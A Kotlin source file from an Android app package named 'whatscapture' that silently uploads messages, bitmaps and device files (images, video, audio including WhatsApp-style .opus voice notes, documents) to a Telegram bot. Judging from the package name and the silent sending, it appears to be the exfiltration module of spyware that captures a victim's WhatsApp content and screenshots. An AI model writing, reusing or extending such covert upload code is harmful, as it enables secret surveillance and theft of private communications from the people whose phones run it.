package com.whatscapture

import android.graphics.Bitmap
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

object TelegramSender {

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private const val API_BASE = "https://api.telegram.org/bot"

    fun sendMessage(token: String, chatId: String, text: String) {
        try {
            val json = """
                {
                    "chat_id": "$chatId",
                    "text": "${escapeJson(text)}",
                    "parse_mode": "Markdown",
                    "disable_notification": true
                }
            """.trimIndent()

            val body = json.toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("${API_BASE}${token}/sendMessage")
                .post(body)
                .build()

            val response = client.newCall(request).execute()
            if (!response.isSuccessful) {
                Log.e(TAG, "Error sendMessage: ${response.body?.string()}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exception sendMessage", e)
        }
    }

    fun sendPhoto(token: String, chatId: String, bitmap: Bitmap, caption: String) {
        try {
            val stream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.PNG, 90, stream)
            val byteArray = stream.toByteArray()
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", caption)
                .addFormDataPart("photo", "image.png", byteArray.toRequestBody("image/png".toMediaType()))
                .addFormDataPart("disable_notification", "true")
                .build()

            val request = Request.Builder()
                .url("${API_BASE}${token}/sendPhoto")
                .post(requestBody)
                .build()

            val response = client.newCall(request).execute()
            if (!response.isSuccessful) {
                Log.e(TAG, "Error sendPhoto: ${response.body?.string()}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exception sendPhoto", e)
        }
    }

    fun sendFile(token: String, chatId: String, filePath: String, fileName: String) {
        try {
            val file = java.io.File(filePath)
            if (!file.exists()) return

            val mediaType = getMimeType(fileName)
            val fileBody = file.readBytes().toRequestBody(mediaType.toMediaType())

            val method = when {
                fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") || fileName.endsWith(".png") ||
                    fileName.endsWith(".gif") || fileName.endsWith(".webp") -> "sendPhoto"
                fileName.endsWith(".mp4") || fileName.endsWith(".3gp") || fileName.endsWith(".mkv") -> "sendVideo"
                fileName.endsWith(".mp3") || fileName.endsWith(".ogg") || fileName.endsWith(".m4a") ||
                    fileName.endsWith(".opus") -> "sendAudio"
                fileName.endsWith(".doc") || fileName.endsWith(".docx") || fileName.endsWith(".pdf") ||
                    fileName.endsWith(".txt") -> "sendDocument"
                else -> "sendDocument"
            }

            val fieldName = when (method) {
                "sendPhoto" -> "photo"
                "sendVideo" -> "video"
                "sendAudio" -> "audio"
                else -> "document"
            }

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart(fieldName, fileName, fileBody)
                .addFormDataPart("disable_notification", "true")
                .build()

            val request = Request.Builder()
                .url("${API_BASE}${token}/$method")
                .post(requestBody)
                .build()

            val response = client.newCall(request).execute()
            if (!response.isSuccessful) {
                Log.e(TAG, "Error sendFile: ${response.body?.string()}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exception sendFile", e)
        }
    }

    private fun getMimeType(fileName: String): String {
        return when {
            fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") -> "image/jpeg"
            fileName.endsWith(".png") -> "image/png"
            fileName.endsWith(".gif") -> "image/gif"
            fileName.endsWith(".webp") -> "image/webp"
            fileName.endsWith(".mp4") -> "video/mp4"
            fileName.endsWith(".3gp") -> "video/3gpp"
            fileName.endsWith(".mkv") -> "video/x-matroska"
            fileName.endsWith(".mp3") -> "audio/mpeg"
            fileName.endsWith(".ogg") -> "audio/ogg"
            fileName.endsWith(".m4a") -> "audio/mp4"
            fileName.endsWith(".opus") -> "audio/opus"
            fileName.endsWith(".pdf") -> "application/pdf"
            fileName.endsWith(".doc") -> "application/msword"
            fileName.endsWith(".docx") -> "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
            fileName.endsWith(".txt") -> "text/plain"
            else -> "application/octet-stream"
        }
    }

    private fun escapeJson(text: String): String {
        return text.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }

    private const val TAG = "TelegramSender"
}
